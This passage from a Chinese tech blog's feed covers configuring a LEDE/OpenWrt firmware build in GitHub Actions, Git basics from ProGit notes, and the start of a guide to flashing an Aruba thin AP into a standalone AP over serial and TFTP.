&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Update feeds&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i 's/\&quot;#src-git\&quot;/\&quot;src-git\&quot;/g' ./feeds.conf.default&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;./scripts/feeds update -a&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;./scripts/feeds install -a&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run: |&lt;/code&gt; 的下一行添加： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo 'src-git helloworld https://github.com/fw876/helloworld' &amp;gt;&amp;gt; ./feeds.conf.default&lt;/code&gt;，添加完后配置为：&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Update feeds&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;echo 'src-git helloworld https://github.com/fw876/helloworld' &amp;gt;&amp;gt; ./feeds.conf.default&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i 's/\&quot;#src-git\&quot;/\&quot;src-git\&quot;/g' ./feeds.conf.default&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;./scripts/feeds update -a&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;./scripts/feeds install -a&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;添加自定义的插件和默认网络配置&quot;&gt;添加自定义的插件和默认网络配置&lt;/h4&gt;

&lt;p&gt;修改 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openwrt-ci.yml&lt;/code&gt; 如下部分：&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Generate configuration file&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;make defconfig&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将之前生成的配置差异文件 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;diff.config&lt;/code&gt; 中的内容拷贝出来，填入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openwrt-ci.yml&lt;/code&gt; ，并增加默认网络配置，配置后如下：&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Generate configuration file&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;rm -f ./.config*&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;touch ./.config&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;cat &amp;gt;&amp;gt; .config &amp;lt;&amp;lt;EOF&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;#&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# ========================固件定制部分========================&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;#&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_TARGET_x86=y&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_TARGET_x86_64=y&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_TARGET_x86_64_DEVICE_generic=y&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# CONFIG_PACKAGE_luci-app-accesscontrol is not set&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# CONFIG_PACKAGE_luci-app-arpbind is not set&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_PACKAGE_luci-app-autoreboot=m&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_PACKAGE_luci-app-ddns=m&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# CONFIG_PACKAGE_luci-app-filetransfer is not set&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_PACKAGE_luci-app-frpc=m&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_PACKAGE_luci-app-ipsec-vpnd=m&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_PACKAGE_luci-app-nlbwmon=m&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;CONFIG_PACKAGE_luci-app-ramfree=m&lt;/span&gt;

          &lt;span class=&quot;s&quot;&gt;...&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# 省略一部分配置信息&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;...&lt;/span&gt;

          &lt;span class=&quot;s&quot;&gt;#&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# ========================固件定制部分结束========================&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;#&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;EOF&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i 's/^[ \t]*//g' ./.config&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;make defconfig&lt;/span&gt;

          &lt;span class=&quot;s&quot;&gt;# 固件网络配置&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;10i # network config&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# 默认 IP 地址，旁路由时不会和主路由的 192.168.1.1 冲突&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;11i uci set network.lan.ipaddr='192.168.1.5'&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;12i uci set network.lan.proto='static'&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;13i uci set network.lan.type='bridge'&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;14i uci set network.lan.ifname='eth0'&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;15i uci set network.lan.netmask='255.255.255.0'&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# 主路由 IP 地址&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;16i uci set network.lan.gateway='192.168.1.1'&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;# 解析国内网站时，上游 DNS 服务器为主路由器&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;17i uci set network.lan.dns='192.168.1.1'&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;sed -i &quot;18i uci commit network\n&quot; ./package/lean/default-settings/files/zzz-default-settings&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;开机后的旁路由设置&quot;&gt;开机后的旁路由设置&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;接口 IP 地址改静态，和主路由同一个网段&lt;/li&gt;
  &lt;li&gt;接口的 IPv4 网关为主路由网关&lt;/li&gt;
  &lt;li&gt;接口的 DNS 地址为主路由地址，也可以为自定义 DNS 地址&lt;/li&gt;
  &lt;li&gt;接口的 DHCP 设置为&lt;strong&gt;忽略此接口&lt;/strong&gt;（DHCP 由主路由来分配）&lt;/li&gt;
  &lt;li&gt;设置相关插件（SSR Plus，广告屏蔽大师 Plus 等）&lt;/li&gt;
&lt;/ol&gt;</content><author><name></name></author><category term="lede" /><category term="openwrt" /><summary type="html">在使用了几年 Linksys WRT1200AC 安装 OpenWrt 固件，用来正常上网后，这两年手头需要正常上网的设备越来越多（Netflix、Apple TV+、美区 iCloud 同步等），终于感觉网速有点不够用了，于是在 NAS 的虚拟机里安装了 LEDE 作为旁路由。在连续多次编译了 lean 大佬的 lede 固件，尝试做到了对于单网口旁路由来说使用最佳，然后记录了更方便进行再次编译的配置方式。</summary></entry><entry><title type="html">progit 笔记 01 - 了解 Git</title><link href="https://blog.securitainment.io/git/github/progit/note/2020/06/25/ProGit-note-01.html" rel="alternate" type="text/html" title="progit 笔记 01 - 了解 Git" /><published>2020-06-25T19:11:36+08:00</published><updated>2020-06-25T19:11:36+08:00</updated><id>https://blog.securitainment.io/git/github/progit/note/2020/06/25/ProGit-note-01</id><content type="html" xml:base="https://blog.securitainment.io/git/github/progit/note/2020/06/25/ProGit-note-01.html">&lt;p&gt;本部分主要介绍了 Git 的逻辑、特点、处理文件的方式、工作流程以及基本的配置。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;git-基础&quot;&gt;Git 基础&lt;/h2&gt;
&lt;h3 id=&quot;git-直接记录快照而非差异比较&quot;&gt;Git 直接记录快照（而非差异比较&lt;/h3&gt;
&lt;p&gt;每次提交更新，或在 Git 中保存项目状态时，Git 对当时的全部文件制作一个快照并保存这个快照的索引。如果文件没有修改，Git 将不再重新存储该文件，而是保留一个指向之前存储的文件的链接。Git 对待数据更像是一个&lt;strong&gt;快照流&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;近乎所有操作都是本地执行&quot;&gt;近乎所有操作都是本地执行&lt;/h3&gt;
&lt;p&gt;Git 的绝大多数操作都只需要访问本地文件和资源，本地磁盘上有项目的的完整历史。如果想要查看当前版本和一个月前的版本之间的修改，Git 会查找一个月前的文件做一次本地的差异计算，而不是由远程服务器处理。&lt;/p&gt;

&lt;h3 id=&quot;git-保证完整性&quot;&gt;Git 保证完整性&lt;/h3&gt;
&lt;p&gt;Git 中的所有数据在存储前都计算校验和，然后以校验和来引用。Git 使用 SHA-1 散列（hash，哈希）作为计算校验和的机制。Git 数据库中保存的信息都是以文件内容的哈希值来索引，而不是文件名。&lt;/p&gt;

&lt;h3 id=&quot;git-一般只添加数据&quot;&gt;Git 一般只添加数据&lt;/h3&gt;
&lt;p&gt;Git 操作一般只往 Git 数据库中增加数据，很难让 Git 执行任何不可逆操作，或者清除数据。&lt;/p&gt;

&lt;h3 id=&quot;git-的三种状态&quot;&gt;Git 的三种状态&lt;/h3&gt;
&lt;p&gt;Git 有三种状态：已提交（committed）、已修改（modified）、和已暂存（staged）。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;committed: 表示数据已经安全的保存在本地数据库中&lt;/li&gt;
  &lt;li&gt;modified: 表示修改了文件，但还没有保存到数据库中&lt;/li&gt;
  &lt;li&gt;staged: 表示对一个已修改的文件的当前版本做了标记，使之包含在下次提交的快照中&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Git 项目的三个工作区域：Git 仓库、工作目录以及暂存区域。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Git 仓库目录是 Git 用来保存项目的元数据和对象数据库的地方。从其他计算机克隆仓库时，拷贝的就是这里的数据&lt;/li&gt;
  &lt;li&gt;工作目录是对项目的某个版本独立提取出来的内容，从 Git 仓库的压缩数据库中提取出来的文件，放在磁盘上供使用或修改&lt;/li&gt;
  &lt;li&gt;暂存区域是一个文件，保存了下次将提交的文件列表信息，一般在 Git 仓库目录中。有时也被称作“索引”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200625111105.jpeg&quot; alt=&quot;Figure 1-6.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;基本的 Git 工作流程：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;在工作目录中修改文件&lt;/li&gt;
  &lt;li&gt;暂存文件，将文件的快照放入暂存区域&lt;/li&gt;
  &lt;li&gt;提交更新，找到暂存区域的文件，将快照永久性存储到 Git 仓库目录&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;初次运行-git-前的配置&quot;&gt;初次运行 Git 前的配置&lt;/h2&gt;
&lt;p&gt;Git 自带一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git config&lt;/code&gt; 的工具来帮助控制 Git 的外观和行为的配置变量，这些变量存储在三个不同的位置：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/gitconfig&lt;/code&gt; 文件：包含系统上每一个用户以及他们仓库的通用配置。如果使用带有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--system&lt;/code&gt; 选项的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git config&lt;/code&gt; 时，它会从此文件读写配置变量&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.gitconfig&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/git/config&lt;/code&gt; 文件：指针对当前用户。可以传递 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--global&lt;/code&gt; 选项让 Git 读写此文件&lt;/li&gt;
  &lt;li&gt;当前使用仓库的 Git 目录中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt; 文件（就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git/config&lt;/code&gt;）：针对该仓库&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;用户信息&quot;&gt;用户信息&lt;/h3&gt;
&lt;p&gt;安装完成 Git 后做的第一件事就是设置用户名称与邮件地址。每一次 Git 提交都会使用这些信息，并且会写入到每一次提交中，不可更改。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.name &lt;span class=&quot;s2&quot;&gt;&quot;John Doe&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.email johndoe@example.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--global&lt;/code&gt; 选项，那么命令只需要运行一次，以后 Git 都会使用这些信息。如果需要针对项目使用不同的用户名称与邮件地址，可以在项目目录下运行没有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--global&lt;/code&gt; 选项的命令来配置。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;文本编辑器&quot;&gt;文本编辑器&lt;/h3&gt;
&lt;p&gt;配置默认文本编辑器，Git 需要输入信息时会调用它。如果未配置，Git 会使用操作系统默认的文本编辑器，通常是 Vim。如果想使用 Emacs：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; core.editor emacs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;检查配置信息&quot;&gt;检查配置信息&lt;/h3&gt;
&lt;p&gt;如果想要检查配置信息，可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git config --list&lt;/code&gt; 命令来列出所有 Git 当时能找到的配置。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config &lt;span class=&quot;nt&quot;&gt;--list&lt;/span&gt;
user.name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;John Doe

user.email&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;johndoe@example.com

color.status&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;auto

color.branch&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;auto

color.interactive&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;auto

color.diff&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;auto

...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可能会出现重复的变量名，因为 Git 会从不同的文件中读取同一个配置（例如从 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tec/gitconfig&lt;/code&gt; 与 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.gitconfig&lt;/code&gt;）。这时 Git 会使用它找到的每一个变量的最后一个配置。&lt;/p&gt;

&lt;p&gt;可以通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git config &amp;lt;key&amp;gt;&lt;/code&gt; 来检查 Git 的某一想配置&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config user.name
John Doe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;获取帮助&quot;&gt;获取帮助&lt;/h2&gt;
&lt;p&gt;有三种方法找到 Git 命令的使用手册：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt; &amp;lt;verb&amp;gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &amp;lt;verb&amp;gt; &lt;span class=&quot;nt&quot;&gt;--help&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;man git-&amp;lt;verb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;例如获取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt; 命令的帮助手册&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="git" /><category term="github" /><category term="progit" /><category term="note" /><summary type="html">本部分主要介绍了 Git 的逻辑、特点、处理文件的方式、工作流程以及基本的配置。</summary></entry><entry><title type="html">捡垃圾的快乐 - Aruba AP（瘦AP）刷机变家用 IAP（胖AP）</title><link href="https://blog.securitainment.io/aruba/ap/2020/06/19/aruba-fit-ap-upgrade-to-fat-ap.html" rel="alternate" type="text/html" title="捡垃圾的快乐 - Aruba AP（瘦AP）刷机变家用 IAP（胖AP）" /><published>2020-06-19T01:59:00+08:00</published><updated>2020-06-19T01:59:00+08:00</updated><id>https://blog.securitainment.io/aruba/ap/2020/06/19/aruba-fit-ap-upgrade-to-fat-ap</id><content type="html" xml:base="https://blog.securitainment.io/aruba/ap/2020/06/19/aruba-fit-ap-upgrade-to-fat-ap.html">&lt;p&gt;由于现在无线设备越来越多，同时需要兼顾看电影、打游戏、办公、智能家居、NAS 下载等，所以感觉现有的无线路由器有点力不从心，就咸鱼 200 块淘了一个 Aruba 的 AP-203R，希望 MU-MIMO 能带来更好的体验。然后淘回来发现是个没办法单独使用的瘦 AP，查找了一番资料，发现可以刷机变成胖 AP 单独使用，这里做个记录。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;购买一条-ttl-线&quot;&gt;购买一条 TTL 线&lt;/h2&gt;

&lt;p&gt;查看 aruba 官网相应版本的说明书（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP-XXX_Install_Guide.pdf&lt;/code&gt;），找到相应的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Console Port&lt;/code&gt; 说明信息，再查找推荐的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP-CBL-SERU cable&lt;/code&gt; 信息，根据文档里的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONNECTOR&lt;/code&gt; 去淘宝找相应的型号，根据文档提供的线序购买。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618174916.jpg&quot; alt=&quot;查询 Installation Guide&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618175122.jpg&quot; alt=&quot;查看 Console Port 支持的线缆&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618175155.jpg&quot; alt=&quot;查询相关线缆&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618175252.jpg&quot; alt=&quot;查看线缆线序和新片&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618175301.jpeg&quot; alt=&quot;购买 Console 线&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;准备软件和资料&quot;&gt;准备软件和资料&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Serial（串口）连接软件（Windows: &lt;a href=&quot;https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html&quot;&gt;Putty&lt;/a&gt;; macOS: &lt;a href=&quot;https://www.decisivetactics.com/products/serial/&quot;&gt;Serial.app&lt;/a&gt;）&lt;/li&gt;
  &lt;li&gt;TFTP Server 软件（Windows: &lt;a href=&quot;https://www.solarwinds.com/free-tools/free-tftp-server&quot;&gt;SolarWinds TFTP Server&lt;/a&gt;; macOS: 自带 TFTP Server）&lt;/li&gt;
  &lt;li&gt;需要刷入 AP 的系统固件（如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArubaInstant_Vela_8.5.0.3_72498&lt;/code&gt;，以及&lt;a href=&quot;https://support.arubanetworks.com/Documentation/tabid/77/DMXModule/512/Default.aspx?EntryId=8868&quot;&gt;其他固件&lt;/a&gt;）
    &lt;ul&gt;
      &lt;li&gt;将固件移动到 TFTP Server 的根目录下，如 SolarWinds TFTP Server 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\TFTP-Root&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;重要&lt;/strong&gt;：关闭电脑防火墙&lt;/li&gt;
  &lt;li&gt;启动 SolarWinds TFTP Server ，显示如下：
  &lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618175437.jpg&quot; alt=&quot;SolarWinds TFTP Server&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;启动-ap&quot;&gt;启动 AP&lt;/h2&gt;

&lt;p&gt;（使用的软件以 Windows 平台为例）首先断开 AP 的电源，把 AP 通过串口连接到电脑上，等待提示驱动安装成功后，打开 Putty，选择连接方式为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Serial&lt;/code&gt;，按照&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;开始菜单（右键） - 设备管理器&lt;/code&gt;中显示的串口号，选择连接的串口，如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COM1&lt;/code&gt;，点击 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Open&lt;/code&gt; 打开：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/2020/06/DeviceMgr.jpg&quot; alt=&quot;查看设备的串口号&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618175335.jpg&quot; alt=&quot;Putty 配置&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后把 AP 接上电源，等待窗口中出现如下字符：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hit &amp;lt;Enter&amp;gt; to stop autoboot:  5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;立即按回车，进入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apboot&lt;/code&gt; 模式：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apboot&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;配置网络&quot;&gt;配置网络&lt;/h2&gt;

&lt;p&gt;将 AP 通过网线连接到电脑，在电脑上设置相关接口为固定 IP 地址，如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.2.10&lt;/code&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200618175402.jpg&quot; alt=&quot;和 AP 连接的网卡 IP 配置&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后开始设置 AP 的地址和 TFTP 服务器&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apboot&amp;gt; setenv ipaddr 192.168.2.20  &lt;span class=&quot;c&quot;&gt;# 配置 AP 的 IP 地址&lt;/span&gt;
apboot&amp;gt; setenv netmask 255.255.255.0    &lt;span class=&quot;c&quot;&gt;# 配置 AP 的子网掩码&lt;/span&gt;
apboot&amp;gt; setenv serverip 192.168.2.10    &lt;span class=&quot;c&quot;&gt;# 配置 TFTP 服务器地址，即电脑的 IP 地址&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;开始给-ap-刷入新固件&quot;&gt;开始给 AP 刷入新固件&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apboot&amp;gt; osinfo  &lt;span class=&quot;c&quot;&gt;# 显示系统中的固件&lt;/span&gt;
Partition 0:
    image &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 0
  machine &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 46
          size: 13864872
       version: 6.5.2.0-6.5.2.0
